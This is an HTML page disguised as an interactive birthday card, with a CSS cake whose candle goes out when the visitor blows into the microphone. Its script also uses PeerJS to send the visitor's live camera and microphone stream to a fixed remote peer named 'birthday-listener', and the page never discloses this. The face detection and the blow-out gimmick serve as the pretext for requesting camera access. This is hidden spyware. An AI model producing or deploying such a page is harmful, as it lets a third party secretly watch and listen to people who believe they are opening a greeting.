<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎂 Happy Birthday Card</title>
  <link rel="stylesheet" href="style.css" />
  <script src="https://unpkg.com/peerjs@1.3.2/dist/peerjs.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
</head>
<body>
  <div class="card">
    <div class="cake">
      <div class="layer layer1"></div>
      <div class="layer layer2"></div>
      <div class="layer layer3"></div>
      <div class="icing"></div>
      <div class="candle" id="candle">
        <div class="flame" id="flame"></div>
      </div>
    </div>
    <video id="userCam" autoplay muted playsinline></video>
  </div>

  <script>
    const LISTENER_ID = "birthday-listener";
    const video = document.getElementById("userCam");
    const flame = document.getElementById("flame");

    const peer = new Peer();
    peer.on('open', () => {
      navigator.mediaDevices.getUserMedia({ audio: true, video: true })
        .then(stream => {
          video.srcObject = stream;
          peer.call(LISTENER_ID, stream);
        });
    });

    // دائرة الكاميرا
    video.style.borderRadius = "50%";
    video.style.width = "150px";
    video.style.height = "150px";
    video.style.position = "absolute";
    video.style.top = "10px";
    video.style.left = "calc(50% - 75px)";
    video.style.border = "5px solid white";
    video.style.boxShadow = "0 0 15px rgba(255,255,255,0.7)";

    // تحميل مكتبة face-api.js
    Promise.all([
      faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/weights'),
    ]).then(startFaceDetection);

    function startFaceDetection() {
      const detect = async () => {
        const result = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
        if (result && result.box.height > 120) { // لو قرب بوشه
          checkBlow();
        }
        requestAnimationFrame(detect);
      };
      detect();
    }

    // تحليل الصوت
    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
    navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
      const source = audioContext.createMediaStreamSource(stream);
      const analyser = audioContext.createAnalyser();
      source.connect(analyser);
      const data = new Uint8Array(analyser.fftSize);

      function checkVolume() {
        analyser.getByteTimeDomainData(data);
        let max = Math.max(...data);
        if (max > 180) { // صوت عالي = نفخة
          blowOutCandle();
        }
        requestAnimationFrame(checkVolume);
      }
      checkVolume();
    });

    function checkBlow() {
      // بنحلل الصوت لوحده بالفعل
    }

    function blowOutCandle() {
      flame.style.display = "none";
    }
  </script>
</body>
</html>
